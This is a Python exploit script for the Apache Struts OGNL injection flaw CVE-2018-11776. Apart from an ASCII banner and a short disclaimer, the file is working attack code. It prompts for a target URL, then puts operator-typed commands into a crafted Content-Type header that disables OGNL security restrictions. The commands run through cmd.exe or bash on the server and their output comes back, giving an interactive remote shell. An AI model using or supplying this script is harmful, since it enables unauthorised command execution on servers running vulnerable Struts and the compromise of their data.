#!/usr/bin/python
# 
# Purpose:               0-Day Vulnerability (CVE-2018-11776) Found in Apache Struts.
# 
# Prerequisites:         Remote Code Execution Vulnerability. 
#
# DISCLAIMER:            Use against your own hosts only. Attacking stuff you are not 
#                        permitted to may put you in big trouble!
#
#

import urllib2
#Arun Bhandari
print"""
_____             _          _____ _           _      ___   _
|  _  |___ ___ ___| |_ ___   |   __| |_ ___ _ _| |_   |   |_| |___ _ _
|     | . | .'|  _|   | -_|  |__   |  _|  _| | |  _|  | | | . | .'| | |
|__|__|  _|__,|___|_|_|___|  |_____|_| |_| |___|_|    |___|___|__,|_  |
     |_|                                                          |___|
                                                          LightCoder
"""
chk=raw_input('Enter URL : ')
cmd='Witch3r'
while(cmd):
    cmd=raw_input('Shell:')
    exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + " && echo witch3r').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    req = urllib2.Request(chk, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': exp})
    con=urllib2.urlopen(req).read()
    end=con.find('witch3r')
    print con[0:end]
